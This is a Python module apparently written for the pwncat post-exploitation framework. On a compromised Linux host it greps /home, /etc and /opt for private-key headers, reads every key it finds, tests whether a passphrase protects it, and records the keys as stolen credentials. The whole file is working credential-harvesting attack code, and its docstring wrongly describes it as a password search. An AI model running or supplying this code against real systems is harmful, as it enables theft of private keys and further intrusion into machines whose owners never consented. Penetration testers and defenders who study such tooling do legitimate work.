#!/usr/bin/env python3
from Crypto.PublicKey import RSA

import pwncat
from pwncat.platform import Platform
from pwncat.modules import Status
from pwncat.modules.enumerate import EnumerateModule, Schedule
from pwncat.modules.enumerate.creds import PrivateKeyData


class Module(EnumerateModule):
    """
    Search the victim file system for configuration files which may
    contain passwords. This uses a regular expression based search
    to abstractly extract things which look like variable assignments
    within configuration files that look like passwords.
    """

    PROVIDES = ["creds.private_key"]
    PLATFORM = Platform.LINUX
    SCHEDULE = Schedule.PER_USER

    def enumerate(self):

        facts = []

        # Search for private keys in common locations
        with pwncat.victim.subprocess(
            "grep -l -I -D skip -rE '^-+BEGIN .* PRIVATE KEY-+$' /home /etc /opt 2>/dev/null | xargs stat -c '%u %n' 2>/dev/null"
        ) as pipe:
            yield Status("searching for private keys")
            for line in pipe:
                line = line.strip().decode("utf-8").split(" ")
                uid, path = int(line[0]), " ".join(line[1:])
                yield Status(f"found [cyan]{path}[/cyan]")
                facts.append(PrivateKeyData(uid, path, None, False))

        for fact in facts:
            try:
                yield Status(f"reading [cyan]{fact.path}[/cyan]")
                with pwncat.victim.open(fact.path, "r") as filp:
                    fact.content = filp.read().strip().replace("\r\n", "\n")

                try:
                    # Try to import the key to test if it's valid and if there's
                    # a passphrase on the key. An "incorrect checksum" ValueError
                    # is raised if there's a key. Not sure what other errors may
                    # be raised, to be honest...
                    RSA.importKey(fact.content)
                except ValueError as exc:
                    if "incorrect checksum" in str(exc).lower():
                        # There's a passphrase on this key
                        fact.encrypted = True
                    else:
                        # Some other error happened, probably not a key
                        continue
                yield "creds.private_key", fact
            except (PermissionError, FileNotFoundError):
                continue
